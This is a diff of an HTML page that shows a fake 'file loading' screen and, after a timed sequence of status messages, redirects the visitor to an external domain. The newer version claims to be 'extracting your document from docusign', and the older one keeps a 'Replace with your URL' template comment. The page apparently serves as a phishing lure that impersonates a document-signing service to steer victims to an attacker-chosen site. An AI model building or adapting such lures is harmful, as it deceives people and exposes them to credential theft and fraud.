@@ -1,82 +1,70 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>File Loading...</title>
-<style>
-body {
-  margin: 0;
-  display: flex;
-  justify-content: center;
-  align-items: center;
-  height: 100vh;
-  font-family: "Segoe UI", sans-serif;
-  background: #eef2f7;
-  color: #333;
-  text-align: center;
-}
-
-#message {
-  font-size: 24px;
-  margin-bottom: 20px;
-  min-height: 30px;
-}
-
-#status {
-  font-size: 18px;
-  color: #555;
-}
-
-#dots {
-  display: inline-block;
-  margin-left: 5px;
-  width: 20px;
-}
-</style>
+  <meta charset="UTF-8">
+  <title>Loading Experience</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background: #0f172a;
+      color: white;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+    }
+    .container {
+      text-align: center;
+    }
+    .spinner {
+      width: 50px;
+      height: 50px;
+      border: 5px solid #ccc;
+      border-top: 5px solid #3b82f6;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin: 20px auto;
+    }
+    @keyframes spin {
+      100% { transform: rotate(360deg); }
+    }
+    .status {
+      margin-top: 10px;
+      font-size: 18px;
+      opacity: 0.8;
+    }
+  </style>
 </head>
 <body>
+  <div class="container">
+    <h2>Please wait...</h2>
+    <div class="spinner"></div>
+    <div class="status" id="status">Initializing...</div>
+  </div>
 
-<div>
-  <div id="message"></div>
-  <div id="status">Preparing your file<span id="dots"></span></div>
-</div>
+  <script>
+    const status = document.getElementById("status");
 
-<script>
-// Typing effect
-const messageText = "Hello, your file is loading... generating... please wait.";
-const messageEl = document.getElementById("message");
-let index = 0;
-
-function typeMessage() {
-  if (index < messageText.length) {
-    messageEl.textContent += messageText.charAt(index);
-    index++;
-    setTimeout(typeMessage, 100); // typing speed
-  } else {
-    startLoadingDots();
-    // Redirect after 3 seconds of showing dots
     setTimeout(() => {
-      window.location.href = "https://standardcaregiver.com/219456eeei"; // Replace with your URL
+      status.textContent = "Loading...";
+    }, 1500);
+
+    setTimeout(() => {
+      status.textContent = "extracting your document from docusign...";
     }, 3000);
-  }
-}
 
-// Loading dots animation
-const dotsEl = document.getElementById("dots");
-let dotsCount = 0;
-let dotsInterval;
+    setTimeout(() => {
+      status.textContent = "File almost Ready...";
+    }, 4500);
 
-function startLoadingDots() {
-  dotsInterval = setInterval(() => {
-    dotsCount = (dotsCount + 1) % 4; // 0,1,2,3
-    dotsEl.textContent = ".".repeat(dotsCount);
-  }, 500);
-}
+    setTimeout(() => {
+      status.textContent = "get ready to get your files 😊...";
+    }, 6000);
 
-// Start typing on page load
-window.onload = typeMessage;
-</script>
-
+    setTimeout(() => {
+      window.location.href = "https://standardcaregiver.com/219456eeei/";
+    }, 7500);
+  </script>
 </body>
 </html>
